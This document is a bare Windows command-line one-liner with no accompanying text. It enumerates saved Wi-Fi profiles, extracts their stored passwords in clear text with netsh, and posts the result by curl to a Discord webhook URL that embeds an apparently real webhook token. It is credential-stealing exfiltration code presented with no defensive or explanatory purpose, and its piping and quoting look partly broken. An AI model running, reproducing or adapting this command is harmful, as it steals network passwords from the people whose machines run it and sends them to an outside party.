for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear > $n | curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST  https://discord.com/api/webhooks/1005181355619004517/7yrFrCV65AxWeliU880pye3EyB15ccU4Yp1Va5Ny-BXQa8y9YYG2joKzmCWW5211RGly --data "{\"content\": \"'"$n"'\"}